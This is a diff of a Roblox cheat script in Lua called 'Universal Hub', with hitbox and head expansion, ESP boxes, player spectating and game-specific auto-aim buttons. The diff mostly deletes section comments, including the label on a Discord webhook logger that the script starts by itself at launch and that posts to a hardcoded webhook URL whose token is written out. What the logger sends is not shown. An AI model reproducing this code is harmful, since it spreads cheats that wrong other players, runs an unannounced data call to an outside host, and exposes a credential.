@@ -4,7 +4,6 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
--- ====================== DISCORD WEBHOOK LOGGER ======================
 local webhookURL = "https://discord.com/api/webhooks/1530636370849042463/Re9hI7l-0YR3wlHh0Onq7CtXlZ1VuJykhqov9ongFUjjBF5rv5RB5GiQWaw6ag_mkeUq"
 
 local function sendWebhook()
@@ -81,7 +80,6 @@ local function sendWebhook()
 	end)
 end
 
--- Send the log when the script runs
 task.spawn(sendWebhook)
 
 local function getExecutorName()
@@ -115,7 +113,6 @@ local window = WindUI:CreateWindow({
 	}
 })
 
--- Creator tag on the window
 if isCreator then
 	pcall(function()
 		window:Tag({
@@ -130,7 +127,6 @@ pcall(function()
 	window:Open()
 end)
 
--- Tabs
 local hitbox_tab = window:Tab({ Title = "Hitbox", Icon = "box" })
 local teams_tab = window:Tab({ Title = "Teams", Icon = "users" })
 local esp_tab = window:Tab({ Title = "Esp", Icon = "eye" })
@@ -140,7 +136,6 @@ local games_tab = window:Tab({ Title = "Games", Icon = "gamepad" })
 local theme_tab = window:Tab({ Title = "Theme", Icon = "palette" })
 local credits_tab = window:Tab({ Title = "Credits", Icon = "info" })
 
--- ====================== SHARED VARIABLES ======================
 local size = 13
 local transparency = 0.5
 local expanded = false
@@ -151,7 +146,6 @@ local currentSpectate = nil
 local selectedSpectatePlayer = nil
 local rainbowConnection = nil
 
--- ====================== HEAD EXPANDER ======================
 
 local function shouldAffectPlayer(targetPlayer)
 	if targetPlayer == LocalPlayer then return false end
@@ -187,7 +181,6 @@ local function ResizeHead(targetPlayer, newSize)
 	end
 end
 
--- ====================== HITBOX TAB ======================
 
 hitbox_tab:Toggle({
 	Title = "Enable Head Expander",
@@ -221,7 +214,6 @@ hitbox_tab:Slider({
 	Callback = function(value) transparency = value end
 })
 
--- ====================== TEAMS TAB ======================
 
 local allTeams = {}
 for _, team in ipairs(game:GetService("Teams"):GetTeams()) do
@@ -244,7 +236,6 @@ teams_tab:Button({
 	Callback = function() print("Team list refreshed") end
 })
 
--- ====================== ESP TAB ======================
 
 local ESP = {}
 ESP.Boxes = {}
@@ -325,7 +316,6 @@ esp_tab:Toggle({
 	end
 })
 
--- ====================== SPECTATE TAB ======================
 
 local function getPlayerList()
 	local list = {}
@@ -392,7 +382,6 @@ game:GetService("RunService").RenderStepped:Connect(function()
 	end
 end)
 
--- ====================== UNIVERSAL TAB ======================
 
 universal_tab:Button({
 	Title = "Universal All Games",
@@ -410,7 +399,6 @@ universal_tab:Button({
 	end
 })
 
--- ====================== GAMES TAB ======================
 
 games_tab:Button({
 	Title = "Basketball Zero: Auto Green",
@@ -436,7 +424,6 @@ games_tab:Button({
 	end
 })
 
--- ====================== THEME TAB ======================
 
 local function stopRainbow()
 	if rainbowConnection then
@@ -479,14 +466,12 @@ theme_tab:Dropdown({
 	end
 })
 
--- ====================== CREDITS TAB ======================
 
 credits_tab:Paragraph({
 	Title = "Credits",
 	Desc = "Credits to Team Void"
 })
 
--- ====================== CORE LOOPS ======================
 
 game:GetService("RunService").Heartbeat:Connect(function()
 	if expanded then
@@ -529,7 +514,6 @@ for _, plr in Players:GetPlayers() do
 	end
 end
 
--- ====================== RIGHT SHIFT TOGGLE ======================
 
 local UIS = game:GetService("UserInputService")
 
@@ -549,4 +533,4 @@ UIS.InputBegan:Connect(function(input, gameProcessed)
 	end
 end)
 
-print("✅ Universal Script Loaded!")
+print("Universal Hub Loaded Twn")
